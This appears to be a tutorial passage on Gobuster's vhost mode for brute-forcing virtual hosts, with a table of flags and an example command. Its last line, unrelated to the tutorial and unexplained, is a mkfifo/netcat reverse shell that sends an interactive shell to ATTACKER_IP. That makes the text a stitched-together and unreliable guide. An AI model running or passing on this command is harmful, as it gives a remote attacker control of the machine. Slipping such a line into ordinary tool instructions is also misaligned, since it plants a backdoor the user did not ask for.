Gobuster is an open source, offensive file enumeration tool. Gobuster has dir mode, allowing to enumerate web subdirectories and their files. A dns mode allows for subdomain enumeration brute forcing.

The last and final mode we’ll focus on is the `vhost` mode. This mode allows Gobuster to brute force virtual hosts. Virtual hosts are different websites on the same machine. Sometimes, they look like subdomains, but don’t be deceived! Virtual hosts are IP-based and are running on the same server. Subdomains are set up in DNS. The  difference between `vhost` and `dns` mode is in the way Gobuster scans:

- `vhost` mode will navigate to the URL created by combining the configured HOSTNAME (-u flag) with an entry of a wordlist.
- `dns` mode will do a DNS lookup to the FQDN created by combining the configured domain name (-d flag) with an entry of a wordlist.

## Help

If you want a complete overview of what the Gobuster `vhost` command can offer, you can have a look at the help page. Seeing the extensive help page for the vhost command can be intimidating. So, we will focus on the most important flags in this room. Type the  following command to display the help: `gobuster vhost --help`  

The `vhost` mode offers flags similar to those of the dir mode. Let us have a look at some of the commonly used flags:

|**Short Flag**|**Long Flag**|**Description**|
|---|---|---|
|`-u`|`--url`|Specifies the base URL (target domain) for brute-forcing virtual hostnames.|
||`--append-domain`|Appends the base domain to each word in the wordlist (e.g., word.example.com).|
|`-m`|`--method`|Specifies the HTTP method to use for the requests (e.g., GET, POST).|
||`--domain`|Appends a domain to each wordlist entry to form a valid hostname (useful if not provided explicitly).|
||`--exclude-length`|Excludes results based on the length of the response body (useful to filter out unwanted responses).|
|`-r`|`--follow-redirect`|Follows HTTP redirects (useful for cases where subdomains may redirect).|

## How To Use vhost Mode

To run Gobuster in `vhost` mode, type the following command:

```
gobuster vhost -u "http://example.thm" -w /path/to/wordlist
```

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f